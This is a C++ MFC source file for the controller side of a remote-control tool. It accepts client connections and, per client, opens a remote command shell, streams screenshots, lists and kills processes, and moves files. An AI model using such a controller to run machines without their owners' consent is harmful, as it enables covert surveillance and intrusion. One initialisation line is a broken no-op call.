
// MfcServerDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "MfcServer.h"
#include "MfcServerDlg.h"
#include "afxdialogex.h"
#include "CmdDlg.h"
#include "ScreenDlg.h"
#include "Process.h"
#include "MyExplorer.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif
//
#define NO_HEARTBEAT

unsigned char g_aryUncomRes[0xFF0000];

// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
  CAboutDlg();

  // 对话框数据
  enum { IDD = IDD_ABOUTBOX };

protected:
  virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

  // 实现
protected:
  DECLARE_MESSAGE_MAP()
public:
  //	afx_msg void OnCmd();
protected:
  //  afx_msg LRESULT OnMyprocdata(WPARAM wParam, LPARAM lParam);
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
  CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
  //	ON_COMMAND(ID_32771, &CAboutDlg::OnCmd)
  //  ON_MESSAGE(WM_MYPROCDATA, &CAboutDlg::OnMyprocdata)
END_MESSAGE_MAP()


// CMfcServerDlg 对话框



CMfcServerDlg::CMfcServerDlg(CWnd* pParent /*=NULL*/)
  : CDialogEx(CMfcServerDlg::IDD, pParent)
  , m_nPort(0)
{
  m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CMfcServerDlg::DoDataExchange(CDataExchange* pDX)
{
  CDialogEx::DoDataExchange(pDX);
  DDX_Control(pDX, IDC_COMBO1, m_ComboIP);
  DDX_Control(pDX, IDC_EDIT2, m_EdPort);
  DDX_Text(pDX, IDC_EDIT2, m_nPort);
  DDV_MinMaxInt(pDX, m_nPort, 1, 65535);
  DDX_Control(pDX, IDC_LIST1, m_Lst);
}

BEGIN_MESSAGE_MAP(CMfcServerDlg, CDialogEx)
  ON_WM_SYSCOMMAND()
  ON_WM_PAINT()
  ON_WM_QUERYDRAGICON()
  ON_BN_CLICKED(IDOK, &CMfcServerDlg::OnBnClickedOk)
  ON_BN_CLICKED(IDC_START, &CMfcServerDlg::OnBnClickedStart)
  ON_NOTIFY(NM_RCLICK, IDC_LIST1, &CMfcServerDlg::OnNMRClickList1)
  ON_COMMAND(ID_32771, &CMfcServerDlg::OnCmd)
  ON_COMMAND(ID_32772, &CMfcServerDlg::OnScreen)
  ON_WM_TIMER()
  ON_MESSAGE(WM_MYSCREENSTART, &CMfcServerDlg::OnMyscreenstart)
  ON_MESSAGE(WM_MYCMDSTART, &CMfcServerDlg::OnCreateCmdDlg)
  ON_COMMAND(ID_32773, &CMfcServerDlg::OnSetProcData)
  ON_MESSAGE(WM_MYPROCSTART, &CMfcServerDlg::OnMyprocstart)
  ON_COMMAND(ID_32774, &CMfcServerDlg::OnMyExplorer)
  ON_BN_CLICKED(IDC_STOP, &CMfcServerDlg::OnBnClickedStop)
  ON_MESSAGE(WM_MYEXPLORERSTART, &CMfcServerDlg::OnMyexplorerstart)
END_MESSAGE_MAP()


// CMfcServerDlg 消息处理程序

BOOL CMfcServerDlg::OnInitDialog()
{
  CDialogEx::OnInitDialog();

  // 将“关于...”菜单项添加到系统菜单中。

  // IDM_ABOUTBOX 必须在系统命令范围内。
  ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
  ASSERT(IDM_ABOUTBOX < 0xF000);

  CMenu* pSysMenu = GetSystemMenu(FALSE);
  if (pSysMenu != NULL)
  {
    BOOL bNameValid;
    CString strAboutMenu;
    bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
    ASSERT(bNameValid);
    if (!strAboutMenu.IsEmpty())
    {
      pSysMenu->AppendMenu(MF_SEPARATOR);
      pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
    }
  }

  // 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
  //  执行此操作
  SetIcon(m_hIcon, TRUE);			// 设置大图标
  SetIcon(m_hIcon, FALSE);		// 设置小图标

  // TODO:  在此添加额外的初始化代码
  
  (0, 15*1000, 0);

  //设置当前的IP和端口
  //m_EdPort.SetWindowText()

  //设置IP
  char szHostName[255] = { 0 };
  hostent* pHostent = NULL;
  int nRet = gethostname(szHostName, 255);
  if (nRet == 0)
  {
    pHostent = gethostbyname(szHostName);
    int* pIp = NULL;
    int i = 0;
    while (pHostent->h_addr_list[i] != NULL)
    {
      pIp = reinterpret_cast<int*>(pHostent->h_addr_list[i]);
      IN_ADDR addr;
      addr.S_un.S_addr = *pIp;
      m_ComboIP.InsertString(i, inet_ntoa(addr));
      i++;
    }
  }

  m_ComboIP.InsertString(0, "0.0.0.0");
  m_ComboIP.SetCurSel(0);

  //设置端口
  m_nPort = 10086;

  //设置列表头信息
  m_Lst.InsertColumn(0, "序号");
  m_Lst.InsertColumn(1, "IP:port");

  //设置列宽
  m_Lst.SetColumnWidth(0, LVSCW_AUTOSIZE_USEHEADER);
  m_Lst.SetColumnWidth(1, LVSCW_AUTOSIZE_USEHEADER);

  //设置List风格
  m_Lst.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES | m_Lst.GetExtendedStyle());

  //初始化IOCP模块
  m_IOCP.Create(this);

  UpdateData(FALSE);

  ((CButton*)GetDlgItem(IDC_START))->EnableWindow(TRUE);
  ((CButton*)GetDlgItem(IDC_STOP))->EnableWindow(FALSE);

#ifdef _DEBUG
  OnBnClickedStart();
#endif

  return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CMfcServerDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
  if ((nID & 0xFFF0) == IDM_ABOUTBOX)
  {
    CAboutDlg dlgAbout;
    dlgAbout.DoModal();
  }
  else
  {
    CDialogEx::OnSysCommand(nID, lParam);
  }
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CMfcServerDlg::OnPaint()
{
  if (IsIconic())
  {
    CPaintDC dc(this); // 用于绘制的设备上下文

    SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

    // 使图标在工作区矩形中居中
    int cxIcon = GetSystemMetrics(SM_CXICON);
    int cyIcon = GetSystemMetrics(SM_CYICON);
    CRect rect;
    GetClientRect(&rect);
    int x = (rect.Width() - cxIcon + 1) / 2;
    int y = (rect.Height() - cyIcon + 1) / 2;

    // 绘制图标
    dc.DrawIcon(x, y, m_hIcon);
  }
  else
  {
    CDialogEx::OnPaint();
  }
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CMfcServerDlg::OnQueryDragIcon()
{
  return static_cast<HCURSOR>(m_hIcon);
}



void CMfcServerDlg::OnBnClickedOk()
{
  // TODO:  在此添加控件通知处理程序代码
  //CDialogEx::OnOK();
}

//接收客户端发送来的数据
DWORD RecvFunc(LPVOID lpParam)
{
  CMfcServerDlg* pDlg = reinterpret_cast<CMfcServerDlg*>(lpParam);
  BOOL bRet = false;
  do
  {
    bRet = pDlg->OnAccept();
  } while (bRet);

  return 0;
}

void CMfcServerDlg::OnBnClickedStart()
{
  ((CButton*)GetDlgItem(IDC_START))->EnableWindow(FALSE);
  ((CButton*)GetDlgItem(IDC_STOP))->EnableWindow(TRUE);

  //开始监听
  //1. 创建TCP socket
  UpdateData(TRUE);
  m_sListen = socket(AF_INET,
    SOCK_STREAM, //流式服务
    IPPROTO_TCP);

  //2. 绑定端口 bind
  //sockaddr addr;
  sockaddr_in addr = { 0 };
  addr.sin_family = AF_INET;
  addr.sin_port = htons(m_nPort); // htonl
  int nIndex = m_ComboIP.GetCurSel();
  CString strIp;
  m_ComboIP.GetLBText(nIndex, strIp);
  addr.sin_addr.S_un.S_addr = inet_addr(strIp.GetBuffer(0));

  int nRet = bind(m_sListen, (sockaddr*)&addr, sizeof(sockaddr_in));
  if (nRet == SOCKET_ERROR)
  {
    return;
  }

  //3. 监听 listen
  listen(m_sListen, SOMAXCONN);

  //创建线程等待用户的连接
  m_hAcceptThread = (HANDLE)_beginthreadex(NULL,
    0,
    (PFN_start_address)RecvFunc,
    this,
    0,
    NULL);
  //4. 等待连接 accept

}

//弹出右键菜单
void CMfcServerDlg::OnNMRClickList1(NMHDR *pNMHDR, LRESULT *pResult)
{
  LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);

  //弹出右键菜单
  CMenu menu;
  menu.LoadMenu(IDR_MENU1);
  CMenu* pSubMenu = menu.GetSubMenu(0);

  POINT pt;
  GetCursorPos(&pt);

  pSubMenu->TrackPopupMenu(TPM_LEFTALIGN,
    pt.x,
    pt.y,
    this
    );

  *pResult = 0;
}

// 显示CMD窗口
LRESULT CMfcServerDlg::OnCreateCmdDlg(WPARAM wParam, LPARAM lParam)
{
  TagClientContext* pContext = (TagClientContext*)wParam;

  //创建一个非模态对话框
  pContext->m_pCmdDlg = new CCmdDlg(pContext->m_sClient);
  if (pContext->m_pCmdDlg != NULL)
  {
    pContext->m_pCmdDlg->Create(IDD_DIALOG1);
    pContext->m_pCmdDlg->ShowWindow(SW_SHOWNORMAL);
  }
  return 0;
}

// 响应CMD右键菜单项
void CMfcServerDlg::OnCmd()
{
  //获取当前的选中行
  int nIndex = m_Lst.GetSelectionMark();
  if (nIndex == -1)
  {
    return;
  }

  //发送消息给客户,通知客户准备cmd信息
  SOCKET sClient = m_Lst.GetItemData(nIndex);

  //SendPacket(sClient, CMD_REQ);
  m_IOCP.Send(sClient, CMD_REQ);
}

// 响应屏幕右键菜单项
void CMfcServerDlg::OnScreen()
{
  //获取当前的选中行
  int nIndex = m_Lst.GetSelectionMark();
  if (nIndex == -1)
  {
    return;
  }

  //发送消息给客户,通知客户准备cmd信息
  SOCKET sClient = m_Lst.GetItemData(nIndex);

  //SendPacket(sClient, SCREEN_REQ);
  m_IOCP.Send(sClient, SCREEN_REQ);
}

// 显示屏幕窗口
afx_msg LRESULT CMfcServerDlg::OnMyscreenstart(WPARAM wParam, LPARAM lParam)
{
  TagClientContext* pContext = (TagClientContext*)wParam;

  //创建一个非模态对话框
  pContext->m_pScreenDlg = new CScreenDlg(pContext->m_sClient);
  if (pContext->m_pScreenDlg != NULL)
  {
    pContext->m_pScreenDlg->Create(IDD_DIALOG2);
    pContext->m_pScreenDlg->ShowWindow(SW_SHOWNORMAL);
  }

  return 0;
}

//发送心跳包
void CMfcServerDlg::OnTimer(UINT_PTR nIDEvent)
{
  // TODO:  在此添加消息处理程序代码和/或调用默认值
#ifndef NO_HEARTBEAT
  //遍历map
  m_cs.Lock();
  std::map<SOCKET, TagClientContext*>::iterator itTmp;
  std::map<SOCKET, TagClientContext*>::iterator it = m_ClientMap.begin();
  m_Lst.DeleteAllItems();
  
  for (; it != m_ClientMap.end(); /*it++*/)
  {
    TagClientContext* pCurClient = it->second;
    itTmp = it++;
    if (clock() - pCurClient->m_curClock > 30 * 1000)
    {
      //从界面中除去上线的列表项
      m_Lst.DeleteItem(pCurClient->m_nListItemIndex);
      //关闭socket
      closesocket(pCurClient->m_sClient);
      //释放资源
      pCurClient->release();
      //从链表中删除
      m_ClientMap.erase(itTmp);
    }
    else
    {
      pCurClient->m_curClock = clock(); // reflash time
      //发送心跳包
      SendPacket(pCurClient->m_sClient, HEART_REQ);
    }
  }

  m_cs.Unlock();
#endif

  CDialogEx::OnTimer(nIDEvent);
}

// 响应进程信息右键菜单项
void CMfcServerDlg::OnSetProcData()
{
  //获取当前的选中行
  int nIndex = m_Lst.GetSelectionMark();
  if (nIndex == -1)
  {
    return;
  }

  //发送消息给客户,通知客户准备进程信息
  SOCKET sClient = m_Lst.GetItemData(nIndex);

  SendPacket(sClient, PROCESS_REQ);
}

// 显示进程信息窗口
afx_msg LRESULT CMfcServerDlg::OnMyprocstart(WPARAM wParam, LPARAM lParam)
{
  TagClientContext* pContext = reinterpret_cast<TagClientContext*>(wParam);

  //创建一个非模态对话框
  pContext->m_pProcessDlg = new CProcess(pContext->m_sClient);
  if (pContext->m_pProcessDlg != NULL)
  {
    pContext->m_pProcessDlg->Create(IDD_DIALOG3);
    pContext->m_pProcessDlg->ShowWindow(SW_SHOWNORMAL);
  }

  return 0;
}

// 响应资源管理器（文件）右键菜单项
void CMfcServerDlg::OnMyExplorer()
{
  //获取当前的选中行
  int nIndex = m_Lst.GetSelectionMark();
  if (nIndex == -1)
  {
    return;
  }

  //发送消息给客户,通知客户准备文件信息
  SOCKET sClient = m_Lst.GetItemData(nIndex);

  SendPacket(sClient, FILE_REQ);
}

// 启动资源管理器
afx_msg LRESULT CMfcServerDlg::OnMyexplorerstart(WPARAM wParam, LPARAM lParam)
{
  TagClientContext* pContext = (TagClientContext*)wParam;

  //创建一个非模态对话框
  pContext->m_pExplorerDlg = new CMyExplorer(pContext->m_sClient);
  if (pContext->m_pExplorerDlg != NULL)
  {
    pContext->m_pExplorerDlg->Create(IDD_DIALOG4);
    pContext->m_pExplorerDlg->ShowWindow(SW_SHOWNORMAL);
  }

  return 0;
}

// 服务器断开，通知所有客户端
void CMfcServerDlg::OnBnClickedStop()
{
  ((CButton*)GetDlgItem(IDC_START))->EnableWindow(TRUE);
  ((CButton*)GetDlgItem(IDC_STOP))->EnableWindow(FALSE);

  m_cs.Lock();
  std::map<SOCKET, TagClientContext*>::iterator itTmp;
  std::map<SOCKET, TagClientContext*>::iterator it
    = m_ClientMap.begin();
  for (; it != m_ClientMap.end(); it++)
  {
    TagClientContext* pCurClient = it->second;
    closesocket(pCurClient->m_sClient);
  }
  this->m_Lst.DeleteAllItems();
  m_cs.Unlock();

}


bool CMfcServerDlg::OnAccept()
{
  CMfcServerDlg* pDlg = this;

  sockaddr_in clientAddr = { 0 };
  clientAddr.sin_family = AF_INET;
  int nAddrLength = sizeof(sockaddr_in);
  SOCKET sClient = accept(pDlg->m_sListen, (sockaddr*)&clientAddr, &nAddrLength);

  if (sClient == INVALID_SOCKET)
  {
    return false;
  }

  //将新来的socket插入到list中
  CString strIndex;
  strIndex.Format("%d", pDlg->m_Lst.GetItemCount());
  CString strIp;
  strIp.Format("%s:%d", inet_ntoa(clientAddr.sin_addr), ntohs(clientAddr.sin_port));

  int nListIndex = pDlg->m_Lst.InsertItem(0, strIndex.GetBuffer());
  pDlg->m_Lst.SetItemText(nListIndex, 1, strIp.GetBuffer());
  //pDlg->m_Lst.InsertItem(1, strIp.GetBuffer());

  pDlg->m_Lst.SetItemData(nListIndex, sClient);

  //新建一个客户端Context
  TagClientContext* pContext = new TagClientContext;
  pContext->m_sClient = sClient;
  pContext->m_MainDlg = pDlg;
  pContext->m_nListItemIndex = nListIndex;
  pContext->m_curClock = clock();


  //添加pContext到hash表中
  pDlg->m_cs.Lock();
  //FD_SET(sClient, &pDlg->m_readFds);

  m_IOCP.Bind(sClient, sClient);

  //当成功的建立了连接后,需要投递第一个Recv请求
  m_IOCP.PostRecv(pContext);
  pDlg->m_ClientMap.insert(
    std::pair<SOCKET, TagClientContext*>(sClient, pContext));
  pDlg->m_cs.Unlock();

  return true;
}

bool CMfcServerDlg::OnRecvData(
  TagClientContext* pContext,
  char nType,
  CBuffer& strRecv,
  int nBufSize)
{
  PBYTE pBuf = strRecv.GetBuffer();

  switch (nType)
  {
    case FILE_RLY:
    {
      //创建一个新的Explorer窗口
      if (pContext->m_MainDlg != NULL)
      {
        pContext->m_MainDlg->SendMessage(WM_MYEXPLORERSTART, (WPARAM)pContext, 0);
      }
    }
      break;

    case FILE_UPLOAD_DATA_RLY:
    {
      // 开始客户端回复准备好上传
      if (pContext->m_pExplorerDlg != NULL)
      {
        pContext->m_pExplorerDlg->SendMessage(WM_MYUPLOAD, (WPARAM)pBuf, nBufSize);
      }
    }
      break;

    case FILE_DOWNLOAD_RLY:
    {
      // 开始客户端回复准备好下载
      if (pContext->m_pExplorerDlg != NULL)
      {
        pContext->m_pExplorerDlg->SendMessage(WM_MYDOWNLOAD, (WPARAM)pBuf, nBufSize);
      }
    }
      break;

    case FILE_LOGICDRIVE_DATA_RLY:
    {
      // 得到客户端发来磁盘信息的回复
      if (pContext->m_pExplorerDlg != NULL)
      {
        pContext->m_pExplorerDlg->SendMessage(WM_MYEXPLORERDRIVEDATA, (WPARAM)pBuf, nBufSize);
      }
    }
      break;

    case FILE_LIST_DATA_RLY:
    {
      // 得到指定文件夹下文件信息的回复
      if (pContext->m_pExplorerDlg != NULL)
      {
        pContext->m_pExplorerDlg->SendMessage(WM_MYEXPLORERFILELIST, (WPARAM)pBuf, nBufSize);
      }
    }
      break;

    case CMD_RLY:
    {
      //表示客户端成功创建了cmd.exe的命令
      //创建一个新的cmd窗口
      if (pContext->m_MainDlg != NULL)
      {
        pContext->m_MainDlg->SendMessage(WM_MYCMDSTART, (WPARAM)pContext, 0);
      }
    }
      break;
    case CMD_DATA_RLY:
    {
      //表示开始传输CMD信息
      if (pContext->m_pCmdDlg != NULL)
      {
//          uLong nOldsize = *(uLong *)&pBuf[nBufSize - sizeof(uLong)];
//  
//          uLong uLuncomSize = nBufSize - sizeof(uLong);
// 
//          Bytef* pDeCompressBuf = new Bytef[nOldsize];
//          if (pDeCompressBuf == NULL)
//          {
//            break;
//          }
// 
//          ZeroMemory(pDeCompressBuf, nOldsize);
// 
//          memcpy(pDeCompressBuf, pBuf, uLuncomSize);
//  
//          int nRet = uncompress((Bytef *)pDeCompressBuf, &uLuncomSize, (Bytef *)pBuf, uLuncomSize);
//         if (Z_OK != nRet)
//         {
//           if (pDeCompressBuf != NULL)
//           {
//             delete pDeCompressBuf;
//             pDeCompressBuf = NULL;
//           }
// 
//           check_error(nRet);
// 
//           break;
//         }
//         
//         CBuffer bufTmp;
//         bufTmp.Write(pDeCompressBuf, uLuncomSize);
// 
//         pContext->m_pCmdDlg->SendMessage(WM_MYCMDDATA, (WPARAM)&bufTmp, (LPARAM)uLuncomSize);
        pContext->m_pCmdDlg->SendMessage(WM_MYCMDDATA, (WPARAM)pBuf, (LPARAM)nBufSize);

      }
    }
      break;
    case PROCESS_RLY:
    {
      //表示收到了传输进程信息请求的确认
      if (pContext->m_pProcessDlg == NULL)
      {
        if (pContext->m_MainDlg != NULL)
        {
          pContext->m_MainDlg->SendMessage(WM_MYPROCSTART, (WPARAM)pContext, 0);
        }
      }
      else
      {
        pContext->m_pProcessDlg->ShowWindow(SW_SHOWNORMAL);
      }
      // 窗口创建成功，请求数据
      SendPacket(pContext->m_sClient, PROCESS_DATA_REQ);
    }
      break;
    case PROCESS_DATA_RLY:
    {
      //表示收到了传输进程信息请求的确认
      if (pContext->m_pProcessDlg != NULL)
      {
        {
          pContext->m_pProcessDlg->SendMessage(WM_MYSETPROCDATA, (WPARAM)pBuf, (LPARAM)pContext);
        }
      }
    }
      break;
    case PROCESS_CLS_RLY_SCS:
    {
      //表示收到了结束进程成功的确认
      pContext->m_pProcessDlg->SendMessage(WM_MYCLSPROCSCS, (WPARAM)nBufSize, (LPARAM)pBuf);
    }
      break;

    case PROCESS_CLS_RLY_FAIL:
    {
      //表示收到了结束进程失败的确认
      pContext->m_pProcessDlg->SendMessage(WM_MYCLSPROCFAIL, (WPARAM)nBufSize, (LPARAM)pBuf);
    }
      break;

    case SCREEN_RLY:
    {
      //表示收到了cmd.exe的数据
      //OnHandleCmdData(pBuf, nBufSize);
      //调用显示数据

      if (pContext->m_pScreenDlg == NULL)
      {
        if (pContext->m_MainDlg != NULL)
        {
          pContext->m_MainDlg->SendMessage(WM_MYSCREENSTART, (WPARAM)pContext, 0);
        }
      }
      else
      {
        //pContext->m_pScreenDlg->ShowWindow(SW_SHOWNORMAL);
      }

	  //发送截图	   
      pContext->m_pScreenDlg->SendMessage(WM_MYSCREENDATA, (WPARAM)pBuf, (LPARAM)nBufSize);

      //请求再发一张屏幕截图
      m_IOCP.Send(pContext->m_sClient, SCREEN_REQ);
    }
      break;

    case HEART_RLY:
    {
      // 判断是否超时，如果超时，就更新界面，清理失效节点
      // 15分钟ping一次，查看是否存活
      int nTimeNow = clock();
      if(nTimeNow - pContext->m_curClock > 3600*15)
      {
        // 超时
        /*pContext->m_nListItemIndex;*/
        nTimeNow = nTimeNow;
      }
    }
      break;
  }

  //删除一个完整的包
  strRecv.Delete(nBufSize);

  return true;
}

